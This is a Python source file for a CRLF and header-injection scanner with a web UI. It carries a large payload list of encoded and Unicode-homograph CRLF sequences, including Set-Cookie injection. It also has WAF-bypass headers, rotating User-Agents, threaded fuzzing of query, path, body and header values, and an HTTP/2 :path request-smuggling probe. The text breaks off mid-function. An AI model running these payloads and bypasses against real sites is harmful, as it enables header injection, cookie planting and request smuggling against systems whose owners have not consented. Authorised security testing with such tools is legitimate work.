#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced CRLF Hunter – Defcon-Level Edition
Includes expanded payloads (Unicode CRLF homographs), CDN/WAF bypass headers, 
and login session support.
"""
from __future__ import annotations
import argparse
import concurrent.futures as futures
import csv
import json
import os
import random
import socket
import ssl
import sys
import threading
import time
import traceback
from dataclasses import dataclass, asdict, field
from typing import Dict, List, Optional, Tuple, Iterable
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests
import gzip
import uuid
import tempfile

# Additional imports for smuggle-h2 support and colorful banner
import ssl
try:
    # h2 is required for HTTP/2 frame construction. Import the top-level module as
    # well as its submodules so we can reference h2.events in the code. If the
    # import fails, set h2 to None so smuggle-h2 mode is gracefully disabled.
    import h2  # type: ignore
    import h2.connection  # type: ignore
    import h2.events  # type: ignore
except ImportError:
    h2 = None  # type: ignore
import string
import re
from io import StringIO
from requests.adapters import HTTPAdapter, Retry

# Optional imports for extended features
try:
    import httpx  # for HTTP/2 support
except ImportError:
    httpx = None
try:
    # FastAPI and responses for optional web UI
    from fastapi import FastAPI, UploadFile, Form, Request, HTTPException
    from fastapi.responses import HTMLResponse, JSONResponse, FileResponse, PlainTextResponse
    import uvicorn
except ImportError:
    FastAPI = None

# -----------------------------------------------------------------------------
# Payload definitions
# -----------------------------------------------------------------------------
DEFAULT_PAYLOADS: List[str] = [
    # Canonical and mixed-case CRLF encodings
    "%0d%0aX-Injected-Canary:%20hunter",
    "%0D%0AX-Injected-Canary:%20hunter",
    "%0d%0aX-Injected-Canary:hunter%0d%0a",
    "%0D%0AX-Injected-Canary:hunter%0D%0A",
    # LF-only and CR-only sequences
    "%0aX-Injected-Canary:%20hunter",
    "%0AX-Injected-Canary:%20hunter",
    "%0dX-Injected-Canary:%20hunter",
    "%0DX-Injected-Canary:%20hunter",
    # Obsolete line folding with space/tab
    "%0d%0a%20X-Injected-Canary:%20hunter",
    "%0D%0A%20X-Injected-Canary:%20hunter",
    "%0d%0a%09X-Injected-Canary:%20hunter",
    "%0D%0A%09X-Injected-Canary:%20hunter",
    # Double encoding and over-encoding variants
    "%250d%250aX-Injected-Canary:%20hunter",
    "%250D%250AX-Injected-Canary:%20hunter",
    "%25250d%25250aX-Injected-Canary:%20hunter",
    "%0d%250aX-Injected-Canary:%20hunter",
    "%0D%250AX-Injected-Canary:%20hunter",
    "%250d%0aX-Injected-Canary:%20hunter",
    "%250D%0AX-Injected-Canary:%20hunter",
    # Over-encoded newline sequences (multiple decoding steps)
    "%25%30AHeader-Test:BLATRUC",      # "%25" -> "%" -> "%0A"
    "%25%30%61Header-Test:BLATRUC",    # variation with lowercase 'a'
    "%25250AHeader-Test:BLATRUC",      # double-encoded "%0A"
    "%%0A0AHeader-Test:BLATRUC",       # "%%0A" might be interpreted as "%0A"
    # Unencoded CRLF (in case server decodes percent-encoding unexpectedly)
    "\r\nX-Injected-Canary: hunter",
    # Backslash-encoded CRLF sequences
    "%5cr%5cnX-Injected-Canary:%20hunter",   # "\r\n" in percent-encoding
    "crlf%5cr%5cnHeader-Test:BLATRUC",       # literal "crlf" plus encoded "\r\n"
    # Unicode escape sequences (for completeness)
    "%u000d%u000aX-Injected-Canary:%20hunter",
    "%u000AHeader-Test:BLATRUC",
    # **Unicode homograph CRLF** (UTF-8 bytes contain 0x0D/0x0A)
    "嘊嘍X-Injected-Canary: hunter",                     # raw U+560A U+560D
    "%E5%98%8A%E5%98%8DX-Injected-Canary:%20hunter",     # percent-encoded "嘊嘍"
    "嘊嘍Set-Cookie: crlf=1",                            # inject a cookie header via unicode
    "%E5%98%8A%E5%98%8DSet-Cookie:%20crlf=1",            # encoded unicode cookie injection
    # Cookie injection (direct CRLF)
    "%0d%0aSet-Cookie:%20crlf=1",
    "%0D%0ASet-Cookie:%20crlf=1",
    "%0d%0aSet-Cookie: crlf=1%0d%0a",
    # Literal LF/CR characters in parameters (edge cases with proxies)
    "\nX-Injected-Canary: hunter",
    "\rX-Injected-Canary: hunter",
]

# Rotating User-Agent pool to evade trivial WAF UA filters
UA_POOL: List[str] = [
    # Updated with a variety of modern browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0",
]

# Default network settings
DEFAULT_THREADS = 40
DEFAULT_TIMEOUT = 12
DEFAULT_RETRIES = 2
DEFAULT_BACKOFF = 0.25
DEFAULT_RATE_LIMIT = 0.0

# -----------------------------------------------------------------------------
# Banner definition
# -----------------------------------------------------------------------------
# A colourful “deathreaper” banner printed at startup. ANSI escape codes are used
# for colouring. If the user’s terminal does not support colour they will
# simply see the plain ASCII art.
BANNER = """
"""

lock = threading.Lock()

# -----------------------------------------------------------------------------
# Web UI job registry (simple in-memory)
# -----------------------------------------------------------------------------
# Each job entry stores the current status ('running' or 'done'), the total number
# of tasks, the number of completed tasks, and the paths to JSON/CSV outputs (if
# generated). The JOBS_LOCK guards concurrent access to the JOBS dictionary.
JOBS: Dict[str, Dict[str, Optional[str] | int | str]] = {}
JOBS_LOCK = threading.Lock()

# -----------------------------------------------------------------------------
# Data structures for findings
# -----------------------------------------------------------------------------
@dataclass
class Finding:
    """Represents a confirmed CRLF/header injection finding."""
    url: str
    method: str
    location: str            # "query", "body", or "path"
    parameter: str           # name of parameter (or '-' for path)
    payload: str
    status: int
    redirected: bool
    evidence: str            # snippet of header or cookie that indicates success
    injected_header_seen: bool
    set_cookie_injected: bool
    raw_header_sample: Dict[str, str] = field(default_factory=dict)

@dataclass
class HarEntry:
    """Minimal HAR entry representation (for HAR output)."""
    request: dict
    response: dict
    startedDateTime: str
    time: int

# -----------------------------------------------------------------------------
# Helper functions
# -----------------------------------------------------------------------------
def parse_header_kv(h: str) -> Tuple[str, str]:
    """Parse a header string "Name: Value" into (name, value)."""
    if ":" not in h:
        raise ValueError(f"Invalid header format: '{h}'. Use 'Name: Value'.")
    k, v = h.split(":", 1)
    return k.strip(), v.strip()

def make_auth_headers(auth: Optional[str]) -> Dict[str, str]:
    """Generate auth headers from shorthand (basic:user:pass, bearer:token, raw:Header: Value)."""
    if not auth:
        return {}
    try:
        mode, rest = auth.split(":", 1)
        mode = mode.lower()
        if mode == "basic":
            user, pwd = rest.split(":", 1)
            import base64
            token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            return {"Authorization": f"Basic {token}"}
        if mode == "bearer":
            return {"Authorization": f"Bearer {rest.strip()}"}
        if mode == "raw":
            k, v = parse_header_kv(rest)
            return {k: v}
        raise ValueError("Unknown auth mode. Use basic|bearer|raw.")
    except Exception as e:
        raise ValueError(f"Invalid --auth value: {e}")

def short_hdrs(hdrs: Dict[str, str], limit: int = 16) -> Dict[str, str]:
    """Truncate header values for evidence display (to avoid huge outputs)."""
    return {k: (v[:limit] + "..." if len(v) > limit else v) for k, v in hdrs.items()}

def url_with_payload(url: str, payload: str, location: str, param_name: str) -> Tuple[str, str]:
    """
    Returns a tuple of (modified_url, location) injecting the payload.
    If location is "query" or "path", we append/replace accordingly.
    """
    parsed = urlparse(url)
    if location == "path":
        # Append the payload as an extra path segment
        new_path = parsed.path
        if not new_path.endswith('/'):
            new_path += '/'
        new_path += payload
        new_url = urlunparse(parsed._replace(path=new_path))
        return new_url, "-"
    elif location == "query":
        # Replace the query param value with payload
        query_params = parse_qsl(parsed.query, keep_blank_values=True)
        new_query = []
        for (k, v) in query_params:
            if k == param_name:
                new_query.append((k, v + payload))
            else:
                new_query.append((k, v))
        new_query_str = urlencode(new_query, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query_str))
        return new_url, param_name
    else:
        # Should not happen for location outside query/path in this helper
        return url, param_name

def build_requests_session(base_headers: Dict[str, str], timeout: int, retries: int,
                           backoff: float, follow_redirects: bool, proxy: Optional[str]) -> requests.Session:
    """Construct a requests.Session with retry logic and connection pooling."""
    s = requests.Session()
    # Set up retries for idempotent methods
    retry = Retry(
        total=retries,
        backoff_factor=backoff,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=frozenset(["GET", "POST", "HEAD"]),
        respect_retry_after_header=True
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update(base_headers or {})
    s.verify = True
    s.max_redirects = 5
    # `follow_redirects` is not a native requests.Session property, 
    # so we'll handle redirects manually in requests calls.
    s.follow_redirects = follow_redirects  # (custom attribute for our use)
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    # If User-Agent not set, rotate a random one
    if not any(h.lower() == "user-agent" for h in s.headers):
        s.headers["User-Agent"] = random.choice(UA_POOL)
    return s

def build_httpx_client(base_headers: Dict[str, str], timeout: int, follow_redirects: bool,
                       proxy: Optional[str], http2: bool) -> Optional[httpx.Client]:
    """Build an httpx.Client for HTTP/2 scanning if available."""
    if httpx is None:
        return None
    try:
        return httpx.Client(
            headers=base_headers,
            timeout=timeout,
            follow_redirects=follow_redirects,
            proxies=proxy,
            http2=http2,
            verify=True
        )
    except Exception:
        return None

def _h2c_upgrade(url: str, method: str, headers: Dict[str, str],
                 data: Optional[str], timeout: int) -> Optional[Tuple[int, Dict[str, str], bytes, bool, dict]]:
    """
    Attempt an HTTP/1.1 -> h2c (HTTP/2 Cleartext) upgrade by sending a raw request.
    Useful for detecting CRLF in cleartext (h2c) upgrade scenario.
    """
    parsed = urlparse(url)
    if parsed.scheme.lower() != "http":
        return None  # h2c only relevant for plaintext
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    # Compose raw HTTP/1.1 request with Upgrade headers
    req_lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    # Add mandatory h2c upgrade headers
    h = dict(headers) if headers else {}
    conn_val = h.get("Connection", "")
    if conn_val:
        conn_val += ", Upgrade, HTTP2-Settings"
    else:
        conn_val = "Upgrade, HTTP2-Settings"
    h["Connection"] = conn_val
    h["Upgrade"] = "h2c"
    h["HTTP2-Settings"] = "AAMAAABkAAQAAP__"  # base64url encoded empty HTTP/2 SETTINGS frame
    for k, v in h.items():
        req_lines.append(f"{k}: {v}")
    body_bytes = b""
    if data:
        body_bytes = data.encode()
        req_lines.append(f"Content-Length: {len(body_bytes)}")
    req_lines.append("")  # end of headers
    raw_request = ("\r\n".join(req_lines) + "\r\n").encode() + body_bytes
    # Send raw socket request
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(raw_request)
        # Read response head (and some body) 
        data_in = sock.recv(8192)
    except Exception:
        sock.close()
        return None
    finally:
        try:
            sock.close()
        except:
            pass
    # Basic HTTP response parsing
    try:
        head, _, body = data_in.partition(b"\r\n\r\n")
        head_text = head.decode("iso-8859-1", errors="replace")
        lines = head_text.split("\r\n")
        status = 0
        if lines and lines[0].startswith("HTTP/"):
            parts = lines[0].split(" ", 2)
            if len(parts) > 1 and parts[1].isdigit():
                status = int(parts[1])
        resp_headers: Dict[str, str] = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                resp_headers[k.strip()] = v.strip()
        redirected = (300 <= status < 400)
        return status, resp_headers, body, redirected, {"h2c": True}
    except Exception:
        return None

# -----------------------------------------------------------------------------
# Scanning Engine
# -----------------------------------------------------------------------------
class Engine:
    """Encapsulates scanning state and operations."""
    def __init__(self, args: argparse.Namespace):
        self.args = args
        # Propagate an optional job identifier from the parsed args. When scanning
        # via the web UI, this allows progress updates to map back to a specific
        # job. If not provided, progress tracking is disabled.
        self.job_id: Optional[str] = getattr(args, "job_id", None)
        # Build base headers from CLI options
        headers: Dict[str, str] = {}
        if args.header:
            for header in args.header:
                k, v = parse_header_kv(header)
                headers[k] = v
        # Auth header from shorthand if provided
        headers.update(make_auth_headers(args.auth))
        # Add advanced CDN/WAF bypass headers (if not already given)
        cdn_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Original-URL": None,  # will fill per target
            "X-Rewrite-URL": None,   # will fill per target
            "X-Override-URL": None   # some frameworks use this
        }
        # We'll set X-Original-URL values later per request based on target path.
        for name, val in cdn_headers.items():
            # Only add if user hasn't supplied this header manually
            if not any(h.lower() == name.lower() for h in headers):
                if val is not None:
                    headers[name] = val
        # Default User-Agent rotation if none provided
        if not any(k.lower() == "user-agent" for k in headers):
            headers["User-Agent"] = random.choice(UA_POOL)
        self.base_headers = headers

        # Cookies from CLI
        cookies: Dict[str, str] = {}
        if args.cookie:
            for c in args.cookie:
                if "=" in c:
                    k, v = c.split("=", 1)
                    cookies[k.strip()] = v.strip()
        self.cookies = cookies

        # Load payloads (from file or default list)
        if args.payloads:
            try:
                with open(args.payloads, "r", encoding="utf-8", errors="ignore") as pf:
                    self.payloads = [x.strip() for x in pf if x.strip()]
            except Exception as e:
                print(f"Error reading payload file: {e}", file=sys.stderr)
                self.payloads = list(DEFAULT_PAYLOADS)
        else:
            self.payloads = list(DEFAULT_PAYLOADS)

        # Build HTTP sessions/clients
        self.req_session = build_requests_session(self.base_headers, args.timeout, 
                                                  args.retries, args.backoff, 
                                                  args.follow_redirects, args.proxy)
        self.httpx_client = build_httpx_client(self.base_headers, args.timeout, 
                                               args.follow_redirects, args.proxy, 
                                               args.http2)
        # If cookies were provided via CLI, update session cookies
        if self.cookies:
            self.req_session.cookies.update(self.cookies)
            if self.httpx_client:
                self.httpx_client.cookies.update(self.cookies)

        # Perform login if configured
        if args.login_url:
            self._perform_login()

        # Prepare thread pool for scanning and set maximum in-flight futures
        self.max_inflight = args.max_inflight if args.max_inflight > 0 else (args.threads * 50)
        self.thread_pool = futures.ThreadPoolExecutor(max_workers=args.threads)
        self.findings: List[Finding] = []
        self.start_time = time.time()

    def _test_injection(self, base_url: str, location: str, param: str, payload: str) -> Optional[Finding]:
        """
        Tests a single payload for a given parameter (or path) in the base URL.
        Returns a Finding if successful. Used by scan() to fuzz query/path/body.
        """
        # Build target URL with payload if applicable
        if self.args.verbose:
            loc_display = f"{location}:{param}" if location != "path" else "path"
            print(f"[SCAN] Testing {base_url} ({loc_display}) with payload: {payload}")
        # Default method/body
        req_method = "GET"
        req_body: Optional[str] = None
        # Body parameters imply a POST
        if location == "body":
            req_method = "POST"
            # Construct a basic form body with the payload
            data_dict = {param: f"test{payload}"}
            req_body = urlencode(data_dict)
            full_url = base_url
        else:
            # Modify the URL for query/path injection
            full_url, effective_param = url_with_payload(base_url, payload, location, param)
            param = effective_param
        try:
            # Use httpx for HTTP/2 targets when requested
            if self.httpx_client and self.args.http2 and base_url.lower().startswith("https"):
                resp = self.httpx_client.request(req_method, full_url, data=req_body, cookies=self.cookies)
                status = resp.status_code
                headers = {k: v for k, v in resp.headers.items()}
                redirected = resp.is_redirect
            else:
                # Otherwise fall back to requests
                resp = self.req_session.request(req_method, full_url, data=req_body,
                                                cookies=self.cookies, allow_redirects=self.args.follow_redirects,
                                                timeout=self.args.timeout)
                status = resp.status_code
                headers = {k: v for k, v in resp.headers.items()}
                redirected = (300 <= status < 400)
            # Evaluate headers for evidence of injection
            injected = any(hdr.lower() == "x-injected-canary" for hdr in headers)
            set_cookie = False
            evidence_list: List[str] = []
            if injected:
                evidence_list.append("Saw X-Injected-Canary header")
            for hdr_name, hdr_val in headers.items():
                if "X-Injected-Canary" in hdr_val:
                    injected = True
                    evidence_list.append(f"Marker in {hdr_name} header value")
                    break
            if "Set-Cookie" in headers:
                sc_val = headers.get("Set-Cookie", "")
                if "crlf=1" in sc_val or any("crlf=1" in c for c in getattr(resp, "cookies", [])):
                    set_cookie = True
                    evidence_list.append("Injected Set-Cookie observed")
            if injected or set_cookie:
                sample_headers = short_hdrs(headers)
                evidence_str = "; ".join(evidence_list) if evidence_list else "(see response)"
                return Finding(url=full_url, method=req_method, location=location, parameter=param,
                               payload=payload, status=status, redirected=redirected, evidence=evidence_str,
                               injected_header_seen=injected, set_cookie_injected=set_cookie,
                               raw_header_sample=sample_headers)
        except Exception:
            return None
        return None

    def _perform_login(self):
        """Handles the initial login workflow prior to scanning."""
        url = self.args.login_url
        method = "POST" if self.args.login_data else "GET"
        print(f"[+] Performing login via {method} {url} ...")
        try:
            if method == "POST":
                resp = self.req_session.post(url, data=self.args.login_data or "", 
                                             allow_redirects=True, timeout=self.args.timeout)
            else:
                resp = self.req_session.get(url, allow_redirects=True, timeout=self.args.timeout)
        except Exception as e:
            print(f"[!] Login request failed: {e}", file=sys.stderr)
            return
        if resp.status_code >= 400:
            print(f"[!] Login HTTP {resp.status_code} - check credentials or login parameters.", file=sys.stderr)
        else:
            # If login was successful (200 or redirect), cookies are stored in session
            set_cookies = resp.history[-1].cookies if resp.history else resp.cookies
            if set_cookies:
                # Copy any cookies to httpx client as well
                try:
                    if self.httpx_client:
                        for c in set_cookies:
                            self.httpx_client.cookies.set(c.name, c.value)
                except Exception:
                    pass
            print(f"[+] Login successful: HTTP {resp.status_code}. Proceeding with scan...")

    def scan(self, urls: List[str]):
        """High-scale scan with bounded in-flight queue for very large URL sets."""
        # Estimate the total number of tasks and register it for progress tracking.
        try:
            total_tasks = estimate_total_tasks(urls, self.payloads, self.args.body_params)
            progress_set_total(self.job_id, total_tasks)
        except Exception:
            pass

        inflight: List[futures.Future] = []
        submit_count = 0

        def _maybe_drain():
            # Drain completed futures until we're under the cap
            nonlocal inflight
            if len(inflight) >= self.max_inflight:
                for done in futures.as_completed(inflight[:]):  # shallow copy to iterate safely
                    inflight.remove(done)
                    fnd = done.result()
                    # update progress bar per completed future
                    progress_update(self.job_id, 1)
                    if fnd:
                        with lock:
                            self.findings.append(fnd)
                    if len(inflight) < self.max_inflight:
                        break

        for target in urls:
            parsed = urlparse(target)
            base_path = parsed.path or "/"
            for hdr in ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL"]:
                if hdr in self.base_headers:
                    self.req_session.headers[hdr] = base_path
                    if self.httpx_client:
                        self.httpx_client.headers[hdr] = base_path

            # Build targets: query/body params + path
            params_to_test: List[Tuple[str, str]] = []
            for (k, _) in parse_qsl(parsed.query, keep_blank_values=True):
                params_to_test.append(("query", k))
            if self.args.body_params:
                for p in self.args.body_params.split(","):
                    params_to_test.append(("body", p.strip()))
            params_to_test.append(("path", "-"))

            # Submit fuzz tasks per param x payload
            for (location, pname) in params_to_test:
                for payload in self.payloads:
                    # optional rate control
                    if self.args.rate > 0:
                        time.sleep(self.args.rate)
                    fut = self.thread_pool.submit(self._test_injection, target, location, pname, payload)
                    inflight.append(fut)
                    submit_count += 1
                    _maybe_drain()

        # Final drain
        for done in futures.as_completed(inflight):
            fnd = done.result()
            # update progress per completed task
            progress_update(self.job_id, 1)
            if fnd:
                with lock:
                    self.findings.append(fnd)

        self.thread_pool.shutdown(wait=True)
        elapsed = time.time() - self.start_time

        for find in self.findings:
            print(f"[!] Vulnerable: {find.url} ({find.parameter}) payload='{find.payload}'")
            print(f"    ==> Evidence: {find.evidence}")
        print(f"[+] Scan completed in {elapsed:.2f} seconds. Findings: {len(self.findings)}")

    # -------------------------------------------------------------------------
    # HTTP/2 → HTTP/1 smuggling detection
    # -------------------------------------------------------------------------
    def smuggle_h2_scan(self, urls: List[str]):
        """
        Perform HTTP/2 to HTTP/1 CRLF smuggling detection against each URL in the list.
        The technique is specific to front-ends that speak HTTP/2 and downgrade to
        HTTP/1, mishandling embedded CRLF sequences in the :path pseudo-header.

        This scan crafts a single HTTP/2 request with a malicious :path that
        contains a CRLF injection to smuggle a second HTTP/1 request. A follow-up
        request to a unique canary path confirms whether the smuggled request
        executed. A vulnerability is reported if the follow-up returns a non-error
        status (e.g. 2xx or 3xx).
        """
        if h2 is None:
            print("[-] h2 library not available. Please install it with 'pip install h2' to use --smuggle-h2 mode.")
            return
        for target in urls:
            target = target.strip()
            if not target:
                continue
            try:
                self._smuggle_single(target)
            except Exception as e:
                print(f"[!] Smuggle scan error for {target}: {e}", file=sys.stderr)

    def _smuggle_single(self, target: str) -> None:
        """
        Probe a single target for HTTP/2 smuggling via CRLF injection. This method
        establishes a TLS connection with ALPN 'h2', sends a malicious HEADERS
        frame with an injected CRLF in the :path, then sends a follow-up GET to
        a canary path. If the follow-up returns a successful status code, the
        target is considered vulnerable.
        """
        parsed = urlparse(target)
        scheme = parsed.scheme.lower()
        if scheme != "https":
            if self.args.verbose:
                print(f"[SCAN] Skipping {target} – smuggle-h2 requires HTTPS (TLS) for ALPN negotiation")
            return
        host = parsed.hostname
        port = parsed.port or 443
        base_path = parsed.path if parsed.path else "/"
        # Generate a unique canary path or use the provided one
        if self.args.canary_path:
            canary = self.args.canary_path
        else:
            canary_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            canary = f"/__crlf_canary_{canary_id}"
        # Build the injected path: include CRLF twice to end the HTTP/1 header section and begin a new request
        # We use percent-encoding for CRLF to avoid client-side sanitisation; the front-end must decode it
        injection = f"{base_path}?q=1%0d%0a%0d%0aGET {canary} HTTP/1.1%0d%0aHost: {host}%0d%0a%0d%0a"
        if self.args.verbose:
            print(f"[SCAN] {target}: smuggle path -> {injection}")
            print(f"[SCAN] {target}: follow-up path -> {canary}")
        # Set up TLS context with ALPN 'h2'
        context = ssl.create_default_context()
        try:
            context.set_alpn_protocols(["h2"])
        except Exception:
            # If ALPN negotiation setting fails, still attempt; some environments may not support it
            pass
        # Establish TLS connection
        with socket.create_connection((host, port), timeout=self.args.timeout) as sock:
            with context.wrap_socket(sock, server_hostname=host) as tls:
                # Negotiate protocol – ensure we got HTTP/2
                negotiated = None
                try:
                    negotiated = tls.selected_alpn_protocol()
                except Exception:
                    pass
                if negotiated != "h2":
                    if self.args.verbose:
                        print(f"[SCAN] {target}: ALPN negotiation did not select HTTP/2 (got {negotiated}). Skipping.")
                    return
                # Initialize H2 connection
                conn = h2.connection.H2Connection()
                conn.initiate_connection()
                tls.sendall(conn.data_to_send())
                # Send malicious request on stream 1
                stream_id = conn.get_next_available_stream_id()
                headers = [
                    (":method", "GET"),
                    (":authority", host),
                    (":scheme", scheme),
                    (":path", injection)
                ]
                conn.send_headers(stream_id, headers, end_stream=True)
                tls.sendall(conn.data_to_send())
                # Immediately send the follow-up canary request on a new stream
                stream_canary = conn.get_next_available_stream_id()
                headers2 = [
                    (":method", "GET"),
                    (":authority", host),
                    (":scheme", scheme),
                    (":path", canary)
                ]
                conn.send_headers(stream_canary, headers2, end_stream=True)
                tls.sendall(conn.data_to_send())
                # Collect responses; we care about the follow-up's status
                saw_canary_status: Optional[int] = None
                try:
                    while True:
                        data = tls.recv(65535)
                        if not data:
                            break
                        events = conn.receive_data(data)
                        for ev in events:
                            # Look for response headers for our canary stream
                            if isinstance(ev, h2.events.ResponseReceived) and ev.stream_id == stream_canary:
                                # Extract :status
                                for name, val in ev.headers:
                                    if name == ":status":
                                        try:
                                            saw_canary_status = int(val)
                                        except Exception:
                                            pass
                                        break
                        # If we've seen status, we can exit the loop early
                        if saw_canary_status is not None:
                            break
                except Exception as e:
                    if self.args.verbose:
                        print(f"[SCAN] {target}: error receiving h2 data: {e}")
                # Report if the follow-up is successful (status < 400)
                if saw_canary_status is not None and saw_canary_status < 400:
                    print(f"[VULN (h2-smuggle)] {target}\n  location=:path param=- status={saw_canary_status} redirected=False\n  payload=HTTP/2 :path CRLF smuggle\n  evidence=h2 smuggle probe: follow-up GET {canary} returned {saw_canary_status}")
                elif self.args.verbose:
                    # Print in verbose mode if not vulnerable
                    if saw_canary_status is None:
                        print(f"[SCAN] {target}: no response received for canary path {canary} (possible protection or network issue)")
                    else:
                        print(f"[SCAN] {target}: canary status {saw_canary_status} (likely not vulnerable)")

    # -------------------------------------------------------------------------
    # Additional methods for raw request scanning and template-based fuzzing
    # -------------------------------------------------------------------------
    def _send_raw(self, method: str, url: str, headers: Dict[str, str], body: Optional[str]):
        """
        Send a raw HTTP request using either requests or httpx depending on
        HTTP/2 settings. Returns the response object. Cookies and redirect
        behaviour honour the Engine's configuration.
        """
        # Use httpx for HTTP/2 if enabled and target is HTTPS
        if self.httpx_client and self.args.http2 and url.lower().startswith("https"):
            return self.httpx_client.request(method, url, headers=headers, content=body, cookies=self.cookies)
        # Fallback to requests
        return self.req_session.request(method, url, headers=headers, data=body,
                                        cookies=self.cookies,
                                        allow_redirects=self.args.follow_redirects,
                                        timeout=self.args.timeout)

    def _evaluate_evidence(self, resp) -> Tuple[bool, bool, List[str], Dict[str, str], int, bool]:
        """
        Examine an HTTP response for evidence of CRLF injection. Returns a tuple
        (injected_header, set_cookie, evidence_list, header_sample, status_code, redirected).
        """
        status = resp.status_code
        headers = {k: v for k, v in resp.headers.items()}
        injected = any(hdr.lower() == "x-injected-canary" for hdr in headers)
        evidence: List[str] = []
        if injected:
            evidence.append("Saw X-Injected-Canary header")
        # Check marker presence in header values
        for hdr_name, hdr_val in headers.items():
            if "X-Injected-Canary" in hdr_val:
                injected = True
                evidence.append(f"Marker in {hdr_name} header value")
                break
        set_cookie = False
        # Check Set-Cookie header or cookie jar for injected cookie
        sc = headers.get("Set-Cookie", "")
        if "crlf=1" in sc or any("crlf=1" in c for c in getattr(resp, "cookies", [])):
            set_cookie = True
            evidence.append("Injected Set-Cookie observed")
        hdr_sample = short_hdrs(headers)
        redirected = (300 <= status < 400)
        return injected, set_cookie, evidence, hdr_sample, status, redirected

    def _record_finding(self, url: str, method: str, location: str, param: str, payload: str,
                        status: int, redirected: bool, ev_list: List[str], hdr_sample: Dict[str, str]) -> Finding:
        """
        Build a Finding dataclass instance from the given parameters and evidence list.
        """
        evidence_str = "; ".join(ev_list) if ev_list else "(see response)"
        return Finding(url=url, method=method, location=location, parameter=param, payload=payload,
                       status=status, redirected=redirected, evidence=evidence_str,
                       injected_header_seen=("Saw X-Injected-Canary header" in ev_list),
                       set_cookie_injected=("Injected Set-Cookie observed" in ev_list),
                       raw_header_sample=hdr_sample)

    def _scan_request_template(self, method: str, url: str, headers: Dict[str, str], body: Optional[str]):
        """
        Given a parsed raw request (method, url, headers, body), fuzz CRLF injection
        points. If the placeholder specified by args.req_placeholder is present in
        any part of the request (URL, header values, or body), replace it with
        each payload. Otherwise, perform automatic fuzzing by appending each
        payload to the path, each query parameter, and (if form-encoded) each
        body parameter. Optionally fuzz header values if --fuzz-headers is set.
        All generated requests are dispatched concurrently via the thread pool.
        """
        placeholder = self.args.req_placeholder
        # Determine if a placeholder exists anywhere
        template_present = False
        if placeholder and placeholder in url:
            template_present = True
        else:
            for v in headers.values():
                if placeholder and placeholder in v:
                    template_present = True
                    break
            if not template_present and body:
                if placeholder and placeholder in body:
                    template_present = True
        tasks: List[Tuple[str, str, Dict[str, str], Optional[str], str, str, str]] = []
        # Template-based fuzzing: simple replacement of placeholder
        if template_present:
            for payload in self.payloads:
                u = url.replace(placeholder, payload) if url else url
                hdrs = {k: v.replace(placeholder, payload) for k, v in headers.items()}
                b: Optional[str] = body
                if b is not None:
                    b = b.replace(placeholder, payload)
                tasks.append((method, u, hdrs, b, "template", "-", payload))
        else:
            # Automatic fuzzing: path injection
            parsed = urlparse(url)
            base_path = parsed.path if parsed.path else "/"
            for payload in self.payloads:
                new_path = base_path + ("" if base_path.endswith("/") else "/") + payload
                new_url = urlunparse(parsed._replace(path=new_path))
                tasks.append((method, new_url, dict(headers), body, "path", "-", payload))
            # Query param injection
            qs = parse_qsl(parsed.query, keep_blank_values=True)
            if qs:
                param_names = list({k for k, _ in qs})
                for payload in self.payloads:
                    new_q = []
                    for (k, v) in qs:
                        new_q.append((k, v + payload))
                    new_url = urlunparse(parsed._replace(query=urlencode(new_q, doseq=True)))
                    for nm in param_names:
                        tasks.append((method, new_url, dict(headers), body, "query", nm, payload))
            # Body injection (for x-www-form-urlencoded content)
            ctype = ""
            for k, v in headers.items():
                if k.lower() == "content-type":
                    ctype = v.lower()
                    break
            if body and "application/x-www-form-urlencoded" in ctype:
                body_pairs = parse_qsl(body, keep_blank_values=True)
                param_names = list({k for k, _ in body_pairs})
                for payload in self.payloads:
                    new_body_pairs = []
                    for (k, v) in body_pairs:
                        new_body_pairs.append((k, v + payload))
                    encoded_body = urlencode(new_body_pairs)
                    tasks.append((method, url, dict(headers), encoded_body, "body", ",".join(param_names), payload))
            # Header value fuzzing (suffix) if enabled
            if getattr(self.args, "fuzz_headers", False):
                for payload in self.payloads:
                    for hk, hv in headers.items():
                        if hk.lower() == "host":
                            continue  # avoid altering Host
                        mutated = dict(headers)
                        mutated[hk] = hv + payload
                        tasks.append((method, url, mutated, body, "headers", hk, payload))
        # Dispatch tasks concurrently
        futs = []
        for (m, u, h, b, loc, param, payload) in tasks:
            futs.append(self.thread_pool.submit(self._one_request_try, m, u, h, b, loc, param, payload))
        for fut in futures.as_completed(futs):
            fnd = fut.result()
            if fnd:
                with lock:
                    self.findings.append(fnd)

    def _one_request_try(self, method: str, url: str, headers: Dict[str, str], body: Optional[str],
                         location: str, param: str, payload: str) -> Optional[Finding]:
        """
        Helper to send a single fuzzed request and evaluate evidence. Returns a
        Finding on success or None.
        """
        try:
            resp = self._send_raw(method, url, headers, body)
        except Exception:
            return None
        injected, set_cookie, ev, hdr_sample, status, redirected = self._evaluate_evidence(resp)
        if injected or set_cookie:
